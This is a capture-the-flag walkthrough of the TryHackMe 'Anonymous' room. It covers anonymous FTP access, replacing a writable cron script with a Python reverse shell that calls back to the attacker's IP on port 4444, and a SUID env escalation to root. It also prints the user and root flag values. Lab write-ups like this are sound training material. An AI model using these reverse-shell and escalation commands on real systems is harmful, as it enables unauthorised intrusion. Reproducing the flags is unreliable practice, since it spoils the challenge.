# CTF Write-Up: Exploiting Writable FTP to Root Access (TRYHACKME ANONYMOUS)

## Target IP: 10.10.130.39
🧭 Initial Reconnaissance

Performed an Nmap scan to identify open services:

nmap 10.10.130.39 -sC -sV

Results:


![Image](https://github.com/user-attachments/assets/c8f9cae7-1813-4d6f-8857-7516f6fb3730)



  FTP (Port 21) — vsftpd 3.0.3 with anonymous login enabled

  SSH (Port 22)

  SMB (Ports 139, 445)

## Anonymous FTP login was allowed and revealed a writable directory:




![Image](https://github.com/user-attachments/assets/03ff907a-6c76-4301-840c-6789e41a1008)




ftp 10.10.130.39
Name: Anonymous
Password: (blank)

ftp> ls
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
ftp> cd scripts
ftp> ls
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000        10148 removed_files.log
-rw-r--r--    1 1000     1000           68 to_do.txt

## 🧪 Exploiting File Execution via FTP

![Image](https://github.com/user-attachments/assets/88bdc669-3d24-4264-abc8-4fbd96a3c5ea)




Upon inspecting clean.sh, it was found to be a script that presumably gets executed by the system:

cat clean.sh
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
    echo "Running cleanup script: nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log
    done
fi

### The writable nature of the scripts directory and this script hinted that the system may be running it on a schedule (e.g., cron job). I replaced the contents of clean.sh with a Python reverse shell:


![Image](https://github.com/user-attachments/assets/06a6a48e-1b8f-42a2-88f2-3599957456c2)




python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.83.247",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

Used FTP put to upload the modified clean.sh:

put clean.sh

## Then set up a listener:

nc -lvnp 4444

## Within seconds, I received a shell.
🧍‍♂️ Privilege Escalation

## Basic recon showed a user named namelessone:

whoami
namelessone

 ## Enumerated for flags:

cat user.txt
## 90d6f992585815ff991e68748c414740

Checked sudo -l — no permissions due to unknown password. However, I attempted a privilege escalation via a known trick:( source : https://gtfobins.github.io/gtfobins/env/#suid)

/usr/bin/env /bin/sh -p

## And it worked — now I had a root shell:

whoami
# root

## Read the final flag:

cat /root/root.txt
## 4d930091c31a622a7ed10f27999af363


![Image](https://github.com/user-attachments/assets/7ae1f282-458a-40dc-b993-f6e5483ca22e)




## 🎯 Summary

## Stage	Technique
Initial Access	Writable FTP + script execution

Privilege Escalation	/usr/bin/env /bin/sh -p (SUID root shell)

User Flag	90d6f992585815ff991e68748c414740

Root Flag	4d930091c31a622a7ed10f27999af363

## Proof of completion

![Image](https://github.com/user-attachments/assets/23bfc4e2-2667-4f5e-85e6-c18383b7c862)
